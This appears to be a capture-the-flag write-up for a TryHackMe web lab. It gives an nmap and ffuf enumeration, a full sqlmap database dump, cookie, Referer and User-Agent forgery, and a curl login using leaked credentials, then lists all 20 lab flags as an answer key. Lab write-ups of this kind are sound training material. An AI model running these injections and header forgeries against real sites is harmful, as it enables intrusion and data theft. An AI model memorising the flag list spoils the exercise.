@@ -1,0 +1,225 @@
+TryHackMe – CTFCOLLECTIONVOL2
+
+📌 Target Information
+Machine IP: 10.48.138.229
+Platform: TryHackMe
+Difficulty: Easy–Medium
+Objective: Capture all 20 flags
+🔍 Phase 1: Enumeration
+Nmap Scan
+nmap -sC -sV -oN scan.txt 10.48.138.229
+Results
+22/tcp → SSH (OpenSSH 5.9p1)
+80/tcp → HTTP (Apache 2.2.22)
+
+👉 Focus on web (port 80)
+
+🌐 Phase 2: Web Exploration
+Homepage
+Title: 360 No Scope!
+View source → multiple hints + encoded data
+🔎 /ready Endpoint
+
+Access:
+
+http://<IP>/ready
+
+👉 Flag 13:
+
+THM{1_c4n'7_b3l13v3_17}
+🤖 Phase 3: robots.txt Analysis
+
+Access:
+
+/robots.txt
+
+Found:
+
+Disallow: /<base64_encoded_path>
+
+👉 Decode Base64 4 times
+
+→ Hidden directory discovered
+
+Source Code Flag
+THM{f4ll3n_b453}
+
+👉 Flag 2
+
+🔐 Phase 4: Hex Decoding
+
+Found:
+
+45 61 73 74 65 72 20 31 3a 20 54 48 4d 7b 34 75 37 30 62 30 37 5f 72 30 6c 6c 5f 30 75 37 7d
+
+👉 Decode → ASCII
+
+THM{4u70b07_r0ll_0u7}
+
+👉 Flag 1
+
+🔑 Phase 5: Credentials in Source
+
+Found:
+
+username: DesKel
+password: heIsDumb
+🚀 Phase 6: Directory Fuzzing
+ffuf
+ffuf -u http://<IP>/FUZZ -w wordlist.txt
+Discovered:
+/login
+
+👉 Flag 3:
+
+THM{y0u_c4n'7_533_m3}
+/small
+
+👉 Flag 19:
+
+THM{700_5m4ll_3yy}
+🍳 Phase 7: Input Manipulation (Food Menu)
+Intercept request using Burp Suite
+Modify input → egg
+
+👉 Flag 11:
+
+THM{366y_b4k3y}
+💉 Phase 8: SQL Injection
+
+Capture login request → use sqlmap
+
+sqlmap -r request.txt --level 3 --risk 3 -D THM_f0und_m3 -T nothing_inside --dump-all
+Results:
+
+👉 Flag 4:
+
+THM{wh47_d1d_17_c057_70_cr4ck_7h3_5ql}
+
+👉 Password cracked: cutie
+
+👉 Additional flag:
+
+THM{1nj3c7_l1k3_4_b055}
+🍪 Phase 9: Cookie Manipulation
+
+Modify cookie:
+
+status=0 → status=1
+
+👉 Flags 6 & 7 obtained
+
+📱 Phase 10: User-Agent Manipulation
+
+Change User-Agent to mobile:
+
+👉 Flag 8:
+
+THM{h3y_r1ch3r_wh3r3_15_my_k1dn3y}
+🔁 Phase 11: Redirect Bypass
+
+Access /ready via Burp (no redirect)
+
+👉 Flag 9:
+
+THM{60nn4_60_f457}
+🔗 Phase 12: Referer Header Exploit
+
+Add header:
+
+Referer: tryhackme.com
+
+👉 Flag 10:
+
+THM{50rry_dud3}
+📜 Phase 13: JavaScript Analysis
+Found jQuery file
+Decoded hidden data
+
+👉 Flag 12:
+
+THM{h1dd3n_j5_f1l3}
+🖼️ Phase 14: Base64 Image Decode
+Extract Base64 image
+Decode using CyberChef
+
+👉 Flag 14:
+
+THM{d1r3c7_3mb3d}
+🎮 Phase 15: Game Exploitation
+
+Interact with game logic
+
+👉 Flag 15:
+
+THM{ju57_4_64m3}
+⚙️ Phase 16: Parameter Pollution
+
+Send:
+
+button1=button1&button2=button2&button3=button3&submit=submit
+
+👉 Flag 16:
+
+THM{73mp3r_7h3_h7ml}
+🔐 Phase 17: Binary → Hex → ASCII
+b = "binary_string"
+d = int(b, 2)
+h = hex(d)[2:]
+print(bytes.fromhex(h).decode())
+
+👉 Output:
+
+THM{j5_j5_k3p_d3c0d3}
+
+👉 Flag 17
+
+🥚 Phase 18: Additional Input Trick
+
+Send:
+
+Egg: Yes
+
+👉 Flag 18:
+
+THM{70ny_r0ll_7h3_366}
+🔓 Phase 19: Final Credential POST
+curl -s -d "username=DesKel&password=heIsDumb" -X POST http://<IP>/
+
+👉 Flag 20:
+
+THM{17_w45_m3_4ll_4l0n6}
+🏁 All Flags (Line-wise)
+Flag 1  → THM{4u70b07_r0ll_0u7}
+Flag 2  → THM{f4ll3n_b453}
+Flag 3  → THM{y0u_c4n'7_533_m3}
+Flag 4  → THM{wh47_d1d_17_c057_70_cr4ck_7h3_5ql}
+Flag 5  → THM{1nj3c7_l1k3_4_b055}
+Flag 6  → (cookie manipulation)
+Flag 7  → (cookie manipulation)
+Flag 8  → THM{h3y_r1ch3r_wh3r3_15_my_k1dn3y}
+Flag 9  → THM{60nn4_60_f457}
+Flag 10 → THM{50rry_dud3}
+Flag 11 → THM{366y_b4k3y}
+Flag 12 → THM{h1dd3n_j5_f1l3}
+Flag 13 → THM{1_c4n'7_b3l13v3_17}
+Flag 14 → THM{d1r3c7_3mb3d}
+Flag 15 → THM{ju57_4_64m3}
+Flag 16 → THM{73mp3r_7h3_h7ml}
+Flag 17 → THM{j5_j5_k3p_d3c0d3}
+Flag 18 → THM{70ny_r0ll_7h3_366}
+Flag 19 → THM{700_5m4ll_3yy}
+Flag 20 → THM{17_w45_m3_4ll_4l0n6}
+💡 Key Takeaways
+Always check:
+robots.txt
+page source
+Chain decoding techniques (Base64 → Hex → ASCII)
+Web apps leak data via:
+headers
+cookies
+hidden endpoints
+SQL Injection still appears in basic labs — exploit it fully
+Burp Suite is essential for:
+request manipulation
+bypassing logic
